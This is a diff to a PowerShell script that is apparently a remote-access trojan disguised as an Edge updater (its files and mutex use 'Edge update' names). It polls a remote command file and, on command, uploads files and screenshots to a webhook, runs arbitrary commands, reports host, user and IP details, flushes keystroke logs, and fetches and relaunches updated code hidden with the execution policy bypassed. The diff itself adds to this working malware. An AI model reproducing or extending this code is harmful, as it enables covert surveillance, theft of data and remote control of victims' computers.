@@ -22,6 +22,7 @@ $vbs  = "$dir\eupd.vbs"
 $log  = "$dir\d.log"
 $posF = "$dir\p.txt"
 $cF   = "$dir\c.txt"
+$tmpC = "$env:TEMP\e_c.txt"
 
 New-Item -ItemType Directory $dir -Force | Out-Null
 if ($PSCommandPath -and $PSCommandPath -ne $self) { Copy-Item $PSCommandPath $self -Force }
@@ -62,11 +63,21 @@ function Send($t) {
   }
 }
 
+function MyIP {
+  try {
+    $i = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null } | Select-Object -First 1
+    if ($i -and $i.IPv4Address) { return $i.IPv4Address.IPAddress }
+    return (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' -and $_.IPAddress -notlike '192.168.56.*' } | Select -First 1).IPAddress
+  } catch { return "?" }
+}
+
 function Ident {
-  $ip = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike '127.*' } | Select -First 1).IPAddress
-  $os = (Get-CimInstance Win32_OperatingSystem).Caption
   $up = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-  "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $os`nUptime: $([int]$up.TotalMinutes) min`nIP: $ip"
+  "Host: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)`nUptime: $([int]$up.TotalMinutes) min`nIP: $(MyIP)"
+}
+
+function HB {
+  Send "[hb] $env:COMPUTERNAME | $env:USERNAME | $(MyIP) | $((Get-CimInstance Win32_OperatingSystem).Caption)"
 }
 
 $mtx = New-Object Threading.Mutex($false, "EdgeUpdCoreMtx")
@@ -138,95 +149,106 @@ $live  = $false
 $hbOn  = $true
 $tUlt  = Get-Date
 $tHb   = Get-Date
+$tErro = (Get-Date).AddMinutes(-11)
 
 if ($Test -or $Debug) { Send "[i] up $env:COMPUTERNAME" }
-if ($hbOn) { Send "[hb] $([Environment]::MachineName) | $env:USERNAME | $((Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike '127.*' } | Select -First 1).IPAddress) | $((Get-CimInstance Win32_OperatingSystem).Caption)" }
+if ($hbOn) { HB }
 
 while ($true) {
   try {
-    $c = (Invoke-WebRequest "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" -UseBasicParsing -TimeoutSec 8).Content
-    if ($c -and $c -ne $ultimo) {
-      Set-Content $cF $c -NoNewline
-      $ultimo = $c
-
-      $cfg = @{}
-      foreach ($l in ($c -split "`n")) {
-        $l = $l.Trim()
-        if (-not $l) { continue }
-        if ($l.StartsWith("#")) { continue }
-        $i = $l.IndexOf("=")
-        if ($i -lt 1) { continue }
-        $k = $l.Substring(0, $i).Trim().ToLower()
-        $v = $l.Substring($i + 1).Trim()
-        if ($v.StartsWith("$k=")) { $v = $v.Substring($k.Length + 1).Trim() }
-        $cfg[$k] = $v
+    Remove-Item $tmpC -ErrorAction SilentlyContinue
+    curl.exe -s -f -o $tmpC "$cmdUrl`?v=$([DateTime]::UtcNow.Ticks)" 2>$null
+    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $tmpC)) {
+      if (((Get-Date) - $tErro).TotalMinutes -gt 10) {
+        $tErro = Get-Date
+        Send "[falha] fetch cmd :: curl $LASTEXITCODE"
       }
-      function Flag($n) { $cfg[$n] -eq "1" }
+      if ($Debug) { Write-Host "FETCH FALHOU $LASTEXITCODE" }
+    } else {
+      $c = Get-Content $tmpC -Raw
+      if ($c -and $c -ne $ultimo) {
+        Set-Content $cF $c -NoNewline
+        $ultimo = $c
 
-      if ((Flag "who") -or (Flag "info")) { try { Send "[who]`n$(Ident)" } catch { Send "[falha] who :: $($_)" } }
+        $cfg = @{}
+        foreach ($l in ($c -split "`n")) {
+          $l = $l.Trim()
+          if (-not $l) { continue }
+          if ($l.StartsWith("#")) { continue }
+          $i = $l.IndexOf("=")
+          if ($i -lt 1) { continue }
+          $k = $l.Substring(0, $i).Trim().ToLower()
+          $v = $l.Substring($i + 1).Trim()
+          if ($v.StartsWith("$k=")) { $v = $v.Substring($k.Length + 1).Trim() }
+          $cfg[$k] = $v
+        }
+        function Flag($n) { $cfg[$n] -eq "1" }
 
-      if (Flag "dump") { try { Flush; Send "[ok] dump" } catch { Send "[falha] dump :: $($_)" } }
+        if (Flag "ping") { Send "[ok] ping" }
+        if ((Flag "who") -or (Flag "info")) { try { Send "[who]`n$(Ident)" } catch { Send "[falha] who :: $($_)" } }
+        if (Flag "dump") { try { Flush; Send "[ok] dump" } catch { Send "[falha] dump :: $($_)" } }
 
-      if (Flag "ls") {
-        try {
-          $p = $cfg["ls_path"]; if (-not $p) { throw "ls_path vazio" }
-          Send "[ok] ls $p`n$((Get-ChildItem $p | Select -First 40 Name,Length | Out-String))"
-        } catch { Send "[falha] ls :: $($cfg['ls_path']) :: $($_)" }
+        if (Flag "ls") {
+          try {
+            $p = $cfg["ls_path"]; if (-not $p) { throw "ls_path vazio" }
+            Send "[ok] ls $p`n$((Get-ChildItem $p | Select -First 40 Name,Length | Out-String))"
+          } catch { Send "[falha] ls :: $($cfg['ls_path']) :: $($_)" }
+        }
+
+        if (Flag "get") {
+          try {
+            $p = $cfg["get_path"]; if (-not $p) { throw "get_path vazio" }
+            if (-not (Test-Path $p)) { throw "nao existe" }
+            curl.exe -s -f --form-string "content=**ok** get $p" -F "files[0]=@$p" $hook | Out-Null
+            Send "[ok] get $p"
+          } catch { Send "[falha] get :: $($cfg['get_path']) :: $($_)" }
+        }
+
+        if (Flag "shot") {
+          try {
+            Add-Type -AssemblyName System.Windows.Forms
+            Add-Type -AssemblyName System.Drawing
+            $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
+            $bmp = New-Object Drawing.Bitmap $b.Width, $b.Height
+            $g = [Drawing.Graphics]::FromImage($bmp)
+            $g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
+            $p = "$env:TEMP\e.png"
+            $bmp.Save($p, [Drawing.Imaging.ImageFormat]::Png)
+            curl.exe -s -f -F "content=**shot** $env:COMPUTERNAME" -F "files[0]=@$p" $hook | Out-Null
+            Send "[ok] shot"
+          } catch { Send "[falha] shot :: $($_)" }
+        }
+
+        if (Flag "sh") {
+          try {
+            if (-not $cfg["sh_cmd"]) { throw "sh_cmd vazio" }
+            Send "[ok] sh`n$((Invoke-Expression $cfg['sh_cmd'] 2>&1 | Out-String))"
+          } catch { Send "[falha] sh :: $($cfg['sh_cmd']) :: $($_)" }
+        }
+
+        if (Flag "shut") { try { & $snd; Send "[ok] shut" } catch { Send "[falha] shut :: $($_)" } }
+
+        if (Flag "webhook") {
+          try { if (-not $cfg["webhook_url"]) { throw "webhook_url vazio" }; $hook = $cfg["webhook_url"]; Send "[ok] webhook alterado" }
+          catch { Send "[falha] webhook :: $($_)" }
+        }
+
+        if (Flag "reboot") { try { Send "[ok] reboot"; Restart-Computer -Force } catch { Send "[falha] reboot :: $($_)" } }
+        if (Flag "sleep")  { try { Send "[ok] sleep"; rundll32.exe powrprof.dll,SetSuspendState 0,1,0 } catch { Send "[falha] sleep :: $($_)" } }
+
+        if (Flag "update") {
+          try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $snd $shutSrc; Set-Content $cF $c -NoNewline; Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
+          catch { Send "[falha] update :: $($_)" }
+        }
+
+        if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }
+        if ($cfg["live"] -eq "1") { $live = $true } elseif ($cfg["live"] -eq "0") { $live = $false }
+        if ($cfg["hb"] -eq "1") { $hbOn = $true } elseif ($cfg["hb"] -eq "0") { $hbOn = $false }
+
+        if (Flag "uninstall") { Uninstall }
       }
-
-      if (Flag "get") {
-        try {
-          $p = $cfg["get_path"]; if (-not $p) { throw "get_path vazio" }
-          if (-not (Test-Path $p)) { throw "nao existe" }
-          curl.exe -s -f --form-string "content=**ok** get $p" -F "files[0]=@$p" $hook | Out-Null
-          Send "[ok] get $p"
-        } catch { Send "[falha] get :: $($cfg['get_path']) :: $($_)" }
-      }
-
-      if (Flag "shot") {
-        try {
-          Add-Type -AssemblyName System.Windows.Forms
-          Add-Type -AssemblyName System.Drawing
-          $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
-          $bmp = New-Object Drawing.Bitmap $b.Width, $b.Height
-          $g = [Drawing.Graphics]::FromImage($bmp)
-          $g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
-          $p = "$env:TEMP\e.png"
-          $bmp.Save($p, [Drawing.Imaging.ImageFormat]::Png)
-          curl.exe -s -f -F "content=**shot** $env:COMPUTERNAME" -F "files[0]=@$p" $hook | Out-Null
-          Send "[ok] shot"
-        } catch { Send "[falha] shot :: $($_)" }
-      }
-
-      if (Flag "sh") {
-        try {
-          if (-not $cfg["sh_cmd"]) { throw "sh_cmd vazio" }
-          Send "[ok] sh`n$((Invoke-Expression $cfg['sh_cmd'] 2>&1 | Out-String))"
-        } catch { Send "[falha] sh :: $($cfg['sh_cmd']) :: $($_)" }
-      }
-
-      if (Flag "shut") { try { & $snd; Send "[ok] shut" } catch { Send "[falha] shut :: $($_)" } }
-
-      if (Flag "webhook") {
-        try { if (-not $cfg["webhook_url"]) { throw "webhook_url vazio" }; $hook = $cfg["webhook_url"]; Send "[ok] webhook alterado" }
-        catch { Send "[falha] webhook :: $($_)" }
-      }
-
-      if (Flag "reboot") { try { Send "[ok] reboot"; Restart-Computer -Force } catch { Send "[falha] reboot :: $($_)" } }
-      if (Flag "sleep")  { try { Send "[ok] sleep";  rundll32.exe powrprof.dll,SetSuspendState 0,1,0 } catch { Send "[falha] sleep :: $($_)" } }
-
-      if (Flag "update") {
-        try { Send "[ok] update"; curl.exe -s -o $self $boot; curl.exe -s -o $snd $shutSrc; Set-Content $cF $c -NoNewline; Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep bypass -f `"$self`""; exit }
-        catch { Send "[falha] update :: $($_)" }
-      }
-
-      if ($cfg["log"] -eq "1") { $logOn = $true } elseif ($cfg["log"] -eq "0") { $logOn = $false }
-      if ($cfg["live"] -eq "1") { $live = $true } elseif ($cfg["live"] -eq "0") { $live = $false }
-      if ($cfg["hb"] -eq "1") { $hbOn = $true } elseif ($cfg["hb"] -eq "0") { $hbOn = $false }
-
-      if (Flag "uninstall") { Uninstall }
     }
-  } catch { if ($Debug) { Write-Host "FETCH FALHOU: $($_)" } }
+  } catch { if ($Debug) { Write-Host "LOOP FALHOU: $($_)" } }
 
   if ($logOn) {
     Start-Sleep -Milliseconds 12
@@ -247,9 +269,6 @@ while ($true) {
     }
   } else { Start-Sleep -Milliseconds 800 }
 
-  if ($hbOn -and ((Get-Date) - $tHb).TotalMinutes -gt 20) {
-    Send "[hb] $env:COMPUTERNAME | $env:USERNAME | $((Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notlike '127.*' } | Select -First 1).IPAddress) | $((Get-CimInstance Win32_OperatingSystem).Caption)"
-    $tHb = Get-Date
-  }
+  if ($hbOn -and ((Get-Date) - $tHb).TotalMinutes -gt 20) { HB; $tHb = Get-Date }
   if ($live -and $logOn -and ((Get-Date) - $tUlt).TotalSeconds -gt 30) { Flush; $tUlt = Get-Date }
 }
